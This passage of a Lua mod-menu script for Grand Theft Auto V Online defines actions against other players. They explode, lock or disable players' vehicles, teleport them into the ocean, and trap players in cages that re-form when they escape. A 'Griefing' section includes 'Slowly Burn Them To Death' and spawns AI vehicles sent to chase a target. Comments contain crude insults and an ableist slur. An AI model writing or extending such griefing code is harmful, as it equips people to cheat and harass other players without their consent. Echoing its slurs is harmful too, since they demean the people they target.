			ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true) 
		end
	end)

	menu.action(health_sub_vehicle_tab,"Destroy Engine", {"killveh"}, "Destroys vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, -4000)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Revive Engine", {"reviveh"}, "Revives vehicle engine", function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(vehicle, 1000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, 1000)
		end
	end)

	menu.action(health_sub_vehicle_tab,"Explode Vehicle", {"explodeveh"}, "Explodes vehicle",function()
		local vehicle = get_player_veh(pid,false)
		if vehicle then
			--local pos = ENTITY.GET_ENTITY_COORDS(vehicle)--tried around with EXPLODE_VEHICLE but didnt work mayb im just rarted
			--FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 7, 1000, true, false, 1, false)
			VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(vehicle)
			VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Boost", {"boost"}, "Sets max speed of vehicle to 50",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Currupt boost", {"Currupt boost"}, "Sets max speed of vehicle to 9999999",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 9999999) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Trash Acceleration", {"tacc"}, "Sets max speed of vehicle to INT_MIN",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, -2147483647) 
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Reset Acceleration", {"reacc"}, "Resets max speed of vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 1) 
		end
	end)
		
	menu.action(mov_sub_vehicle_tab,"East", {"eastveh"}, "Boosts player's vehicle in the East direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 10000, 0, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"West", {"westveh"}, "Boosts player's vehicle in the West direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, -10000, 0, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"South", {"southveh"}, "Boosts player's vehicle in the South direction",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, -10000, 0, true, false, true)
		end
	end)

	menu.action(mov_sub_vehicle_tab,"North", {"northveh"}, "Boosts player's vehicle in the North direction",function()
		northp_vehicle(pid)
	end)

	menu.action(mov_sub_vehicle_tab,"Launch Up", {"launchup"}, "Shoots player up",function()
		launch_vehicle(pid)
	end)

	menu.action(mov_sub_vehicle_tab,"Launch Down", {"launchdown"}, "Shoots player down",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
	end)

	--[[menu.action(mov_sub_vehicle_tab,"Fuck Their Vehicle", {"fuckveh"}, "Fuck player's vehicle",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
		end
		util.yield(100)
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, -10000, true, false, true)
		end
	end)]]

	---menu.action(main,"delete vehicle", {"delveh"}, "Deletes player's vehicle",function() <-- help
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_ENTITY_AS_MISSION_ENTITY(vehicle, true, true)
	---		VEHICLE.DELETE_VEHICLE(vehicle) 
	---	end
	---end)

	menu.action(detach_sub_vehicle_tab,"Detach Trailer", {"detachtrailer"}, "Detaches attached trailer",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_TRAILER(vehicle) 
		end
	end)

	menu.action(detach_sub_vehicle_tab,"Detach from Cargobob", {"detachcbob"}, "Detaches from Cargobob",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.DETACH_VEHICLE_FROM_ANY_CARGOBOB(vehicle) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Lock Doors", {"lockveh"}, "Locks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Unlock Doors", {"unlockveh"}, "Unlocks the doors",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Drivable", {"engineon"}, "Makes player's vehicle drivable again",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, false)		
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Make Vehicle Undrivable", {"engineoff"}, "Makes player's vehicle undrivable",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_UNDRIVEABLE(vehicle, true)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Deploy Landing Gear", {"landing1"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Retract Landing Gear", {"landing0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.CONTROL_LANDING_GEAR(vehicle, 3)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Disable Cargobob's Hook", {"nohook"}, "Disables cargobob's hook. when used, that cargobob's hook will no longer work",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.REMOVE_PICK_UP_ROPE_FOR_CARGOBOB(vehicle)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Strong Turbulence", {"turb1"}, "Makes turbulence stronger",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 1.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"No Turbulence", {"turb0"}, "Makes turbulence weaker",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(vehicle, 0.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 100%", {"propel100"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 1.0)		
		end
	end)

	menu.action(plane_sub_vehicle_tab,"Set Propeller Speed at 0%", {"propel0"}, "",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_HELI_BLADES_SPEED(vehicle, 0.0)		
		end
	end)

	---menu.action(plane_sub_vehicle_tab,"Destroy Rear Helicopter Roter", {"bunlockcar"}, "",function() <--- I have no ideas what am I doing here
	---	local vehicle = get_player_veh(pid,true)
	---	if vehicle then
	---		VEHICLE.SET_HELI_TAIL_ROTOR_HEALTH(vehicle, 0)		
	---	end
	---end)

	menu.action(lock_sub_vehicle_tab,"Lock that bitch in", {"blockcar"}, "Locks the doors, paints the car Hot Pink, changes plate text to 'LOCKED'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4) 
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 135, 135)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LOCKED")
		end
	end)

	menu.action(lock_sub_vehicle_tab,"Release that bitch out", {"bunlockcar"}, "Unlocks the doors, paints the vehicle Green, changes plate text to 'URFREE'",function()
		local vehicle = get_player_veh(pid,true)
		if vehicle then
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
			VEHICLE.SET_VEHICLE_COLOURS(vehicle, 92, 92)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "URFREE")		
		end
	end)

	menu.action(mov_sub_vehicle_tab,"Teleport to me", {"tp2me"}, "Tries to teleport player's vehicle to you",function()
		local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
		tp_veh_to(pid,coords.x,coords.y,coords.z)
	end)
	menu.action(mov_sub_vehicle_tab,"Teleport to ocean", {"tp2sea"}, "Tries to teleport player's vehicle to the ocean",function()	
		tp_veh_to(pid, -15000, -15000,0)
	end)


	
	griefing = menu.list(main, "Griefing", {}, "", function(); end)

	cage_options = menu.list(griefing, "Cage Options", {}, "")
	
	menu.divider(cage_options, "Cage Options")

	menu.action(cage_options, "Simple", {"cage"}, "", function()
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("Failed to kick player out of the vehicle", colors.red)
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --if not it could place the cage at the wrong position
		end
		cage_player(pos)
	end)
---------------------------------------------------------------------------------------------------------------------------------
	
	menu.action(cage_options, "First Job", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)

		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)

		--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		--rot.y = 90
		--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
menu.action(cage_options, "Married Simulator", {"doghousecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = -1782242710
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time", {"jollycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time v2", {"jollycage2"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time v3", {"jollycage3"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "'Safe' Space", {"safecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90

	ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
	util.yield(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Average X-Force User", {"trashcage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

menu.action(cage_options, "money cage", {"moneycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right

	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right

	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)


----------------------------------------------------------------------------------------------------------------------------------







	menu.action(cage_options, "Stunt Tube", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2081936690)

		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)
							
	local cage_loop = false
	menu.toggle(cage_options, "automatic", {"autocage"}, "Cage them in a trap. If they get out... Do it again. No, I'll do it for you actually", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				util.yield(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					notification("Failed to kick player out of the vehicle", colors.red)
					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --current position
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				notification(PLAYER.GET_PLAYER_NAME(pid).." was out of the cage. Doing it again", colors.pink)
				::continue::
			end
			util.yield(1000)
		end
	end)



	
menu.action(cage_options, "Slowly Burn Them To Death", {}, "use this to slowly kill the poor caged person (ONLY WORKS WITH SOME CAGES)", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("prop_beach_fire")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do
		STREAMING.REQUEST_MODEL(hash)	
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1.75, true, true, false) -- front

	cages[#cages + 1] = cage_object

	local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	rot.y = 90
end)








	menu.action(cage_options, "Release Player", {"release"}, "Attempts to delete spawned cages, for more complicated traps it will delete one side.", function() -- ez fix but lazy
		for key, value in pairs(cages) do
			entities.delete_by_handle(value)
		end
	end)

	local trolly_vehicles = menu.list(griefing, "Trolly Vehicles")

	function set_ent_face_ent(ent1, ent2) --All credits to Ren for suggesting me this function
		local pos1 = ENTITY.GET_ENTITY_COORDS(ent1)
		local pos2 = ENTITY.GET_ENTITY_COORDS(ent2)
		local dx = pos2.x - pos1.x
		local dy = pos2.y - pos1.y
		local heading = MISC.GET_HEADING_FROM_VECTOR_2D(dx, dy)
		return ENTITY.SET_ENTITY_HEADING(ent1, heading)
	end
	function set_ped_can_be_knocked_off_veh(ped, state)
		native_invoker.begin_call()
		native_invoker.push_arg_int(ped)
		native_invoker.push_arg_int(state)
		native_invoker.end_call("7A6535691B477C48")
	end
	function add_blip_for_entity(entity, blipSprite, colour)
		local blip_ptr = memory.alloc()
		local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
		memory.write_int(blip_ptr, blip)
		HUD.SET_BLIP_SPRITE(blip, blipSprite)
		HUD.SET_BLIP_COLOUR(blip, colour)
		HUD.SHOW_HEIGHT_ON_BLIP(blip, false)
		HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
		util.create_thread(function()
			local netId = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
			while NETWORK.NETWORK_DOES_ENTITY_EXIST_WITH_NETWORK_ID(netId) do
				HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
				if ENTITY.IS_ENTITY_DEAD(NETWORK.NET_TO_ENT(netId)) then
					break	
				end
				util.yield()
			end
			HUD.SET_BLIP_DISPLAY(blip, 0)
			--HUD.REMOVE_BLIP(memory.read_int(blip_ptr))
			memory.free(blip_ptr)
		end)
		return blip
	end

	local config_list = {
		['controls'] = {
			['Vehicle Weapons'] = 86,
			['Airstrike Aircraft'] = 86
		},
		['driving style'] = {
			['Bandito Driving Style'] = 786988
		}
	}
	local function delete_entities_by_model(model)
		local hash = util.joaat(model)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			for k, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
				if ENTITY.GET_ENTITY_MODEL(vehicle) == hash then
					for k, ped in pairs(entities.get_all_peds_as_handles()) do
						if PED.GET_VEHICLE_PED_IS_IN(ped, true) == vehicle then
							if not PED.IS_PED_A_PLAYER(ped) then
								ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, false); entities.delete_by_handle(ped)
							else
								goto continue
							end
						end
					end
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, false); entities.delete_by_handle(vehicle)
					::continue::
				end
			end
			return
		end
		if STREAMING.IS_MODEL_A_PED(hash) then
			for k, ped in pairs(entities.get_all_peds_as_handles()) do
				if ENTITY.GET_ENTITY_MODEL(ped) == hash then
					if not PED.IS_PED_A_PLAYER(ped) then
						ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, false, false); entities.delete_by_handle(ped)
					end
				end
			end
			return
		end
		for k, object in pairs(entities.get_all_objects_as_handles()) do
			if ENTITY.GET_ENTITY_MODEL(object) == hash then
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false); entities.delete_by_handle(object)
			end
		end
	end

	local function spawn_trolly_vehicle(pid, vehicleHash, pedHash)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
		local coords_ptr, nodeId = memory.alloc(), memory.alloc()
		local coords
		if not PATHFIND.GET_RANDOM_VEHICLE_NODE(pos.x, pos.y, pos.z, 100, 0, 0, 0, coords_ptr, nodeId) then
			pos.x = pos.x + math.random(-20,20)
			pos.y = pos.y + math.random(-20,20)
			PATHFIND.GET_CLOSEST_VEHICLE_NODE(pos.x, pos.y, pos.z, coords_ptr, 1, 100, 2.5)
			coords = memory.read_vector3(coords_ptr)
		else
			coords = memory.read_vector3(coords_ptr)
		end
		memory.free(coords_ptr); memory.free(nodeId)

		local vehicle = entities.create_vehicle(vehicleHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
			local tick = 0
			while not ENTITY.DOES_ENTITY_EXIST(vehicle) and tick <= 10 do
				vehicle = entities.create_vehicle(vehicleHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
				tick = tick + 1
				util.yield()
			end
		end
		VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
		for i = 0, 50 do
			VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
		end
		VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
		VEHICLE.SET_VEHICLE_IS_CONSIDERED_BY_PLAYER(vehicle, false)
		set_ent_face_ent(vehicle, player_ped)

		local driver = entities.create_ped(5, pedHash, coords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
		PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
		PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
		TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, player_ped, 6, 500.0, config_list['driving style']['Bandito Driving Style'], 0.0, 0.0, true)
		set_ped_can_be_knocked_off_veh(driver, 1)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash); STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
		return vehicle, driver
	end
	
	local bandito_godmode = false
	
	menu.divider(trolly_vehicles, "Bandito")
	
	menu.click_slider(trolly_vehicles, 'Send Bandito', {'sendbandito'}, '', 1,25,1,1, function(quantity)
		local bandito_hash = util.joaat("rcbandito")
		local ped_hash = util.joaat('mp_m_freemode_01')
		STREAMING.REQUEST_MODEL(bandito_hash); STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(bandito_hash) and not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
		for i = 1, quantity do
			local bandito, driver = spawn_trolly_vehicle(pid, bandito_hash, ped_hash)
			add_blip_for_entity(bandito, 646, 4)
			ENTITY.SET_ENTITY_INVINCIBLE(bandito, bandito_godmode)
